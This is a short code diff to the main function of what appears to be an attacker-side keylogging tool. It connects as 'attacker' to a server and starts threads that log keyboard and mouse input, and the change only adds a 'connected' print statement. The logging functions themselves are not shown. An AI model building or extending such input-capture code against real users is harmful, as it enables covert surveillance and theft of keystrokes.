@@ -10,6 +10,7 @@ def main():
 
     functions.connect_as_attacker(ip_for_connection_as_attacker=ip_for_conection, ip_of_server=server_ip,
                                   attacker_socket=attacker_socket)
+    print('connected')
     Thread(target=functions.log_keyboard, args=(server_ip, attacker_socket,)).start()
     Thread(target=functions.log_mouse, args=(server_ip, attacker_socket,)).start()
 
